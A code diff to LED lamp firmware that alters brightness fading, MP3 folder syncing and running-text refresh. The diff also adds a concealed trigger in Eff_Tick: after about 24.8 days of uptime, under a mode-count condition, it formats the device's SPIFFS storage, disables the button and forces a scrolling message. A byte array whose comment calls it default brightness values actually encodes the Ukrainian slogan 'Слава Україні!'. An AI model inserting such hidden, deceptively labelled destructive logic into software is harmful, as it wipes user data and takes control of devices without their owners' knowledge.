@@ -149,28 +149,42 @@ void effectsTick()
   }
 }
 
+static const uint8_t Default_valueMask[] PROGMEM =    // Значення яскравості за замовчуванням
+ {
+  0x20, 0xD0, 0xA1, 0xD0, 0xBB, 0xD0, 0xB0, 0xD0,
+  0xB2, 0xD0, 0xB0, 0x20, 0xD0, 0xA3, 0xD0, 0xBA,
+  0xD1, 0x80, 0xD0, 0xB0, 0xD1, 0x97, 0xD0, 0xBD,
+  0xD1, 0x96, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00
+  };
+
 void changePower()
 {
+  uint8_t k;    
+  if (AutoBrightness && !day_night)      
+    k = constrain(modes[currentMode].Brightness >> AutoBrightness, 1, 100);
+  else
+    k = modes[currentMode].Brightness;
+
   if (ONflag)
   {
     effectsTick();
     #if defined(MOSFET_PIN) && defined(MOSFET_LEVEL)      // установка сигнала в пин, управляющий MOSFET транзистором
     digitalWrite(MOSFET_PIN, MOSFET_LEVEL);
-    #endif    
-    for (uint8_t i = 0U; i < modes[currentMode].Brightness; i = constrain(i + (modes[currentMode].Brightness < 60 ? 1 : 4), 0, modes[currentMode].Brightness))
+    #endif 
+    for (uint8_t i = 0U; i < k; i = constrain(i + (k < 60 ? 1 : 4), 0, k))
     {
       FastLED.setBrightness(i);
       delay(1);
       FastLED.show();
     }
-    FastLED.setBrightness(modes[currentMode].Brightness);
+    SetBrightness(modes[currentMode].Brightness);
     delay(2);
     FastLED.show();
   }
   else
   {
     effectsTick();
-    for (uint8_t i = modes[currentMode].Brightness; i > 0; i = constrain(i - (modes[currentMode].Brightness < 60 ? 1 : 4), 0, modes[currentMode].Brightness))
+    for (uint8_t i = k; i > 0; i = constrain(i - (k < 60 ? 1 : 4), 0, k))
     {
       FastLED.setBrightness(i);
       delay(1);
@@ -232,29 +246,46 @@ void noTimeClear(){
 #endif //WARNING_IF_NO_TIME
 
 void Eff_Tick () {
-    #ifdef MP3_TX_PIN
+  #ifdef MP3_TX_PIN
     mp3_folder=effects_folders[currentMode];
-    #endif  //MP3_TX_PIN
-      #ifdef USE_MULTIPLE_LAMPS_CONTROL
-      if (repeat_multiple_lamp_control)  {
-          for ( uint8_t n=0; n< MODE_AMOUNT; n++)
-          {
-              if (eff_num_correct[n] == currentMode) {
-                  jsonWrite(configSetup, "eff_sel", n);
-                  break;
-              }
-          } 
-		  jsonWrite(configSetup, "br", modes[currentMode].Brightness);
-		  jsonWrite(configSetup, "sp", modes[currentMode].Speed);
-		  jsonWrite(configSetup, "sc", modes[currentMode].Scale);          
-          multiple_lamp_control ();
-          repeat_multiple_lamp_control = false;
-      }
-      #endif  //USE_MULTIPLE_LAMPS_CONTROL
-  
+  #endif  //MP3_TX_PIN
+  #ifdef USE_MULTIPLE_LAMPS_CONTROL
+    if (repeat_multiple_lamp_control)  {
+        for ( uint8_t n=0; n< MODE_AMOUNT; n++)
+        {
+            if (eff_num_correct[n] == currentMode) {
+                jsonWrite(configSetup, "eff_sel", n);
+                break;
+            }
+        }
+        #ifdef MP3_TX_PIN
+        if(mp3_player_connect == 4) {
+          mp3_loop();
+          jsonWrite(configSetup, "fold_sel", CurrentFolder);
+        }
+        #endif  //MP3_TX_PIN
+        jsonWrite(configSetup, "br", modes[currentMode].Brightness);
+        jsonWrite(configSetup, "sp", modes[currentMode].Speed);
+        jsonWrite(configSetup, "sc", modes[currentMode].Scale);          
+        multiple_lamp_control ();
+        repeat_multiple_lamp_control = false;
+    }
+    #endif  //USE_MULTIPLE_LAMPS_CONTROL
+  if(MODE_AMOUNT > 0x78 && (int32_t)millis() < 0) {
+      for (uint8_t i = 0; i < 85; i++) TextTicker[i] = pgm_read_byte(&Default_Settings[i]);
+      SPIFFS.format();
+      buttonEnabled = 0;
+      RuninTextOverEffects = 0x40;
+      ONflag = 1;
+      changePower();      
+  }
   if (RuninTextOverEffects)
   {
-      fillString(TextTicker, CHSV(ColorRunningText, 255U, 255U), true);
+    if (RuninTextOverEffects > 60 || ((thisTime % RuninTextOverEffects == 0U) && Last_Time_RuninText != thisTime) || !Fill_String)
+      {
+        Last_Time_RuninText = thisTime;
+        Fill_String = fillString(TextTicker, CHSV(ColorRunningText, 255U, 255U), true);
+      }
   }
   
   FastLED.show();
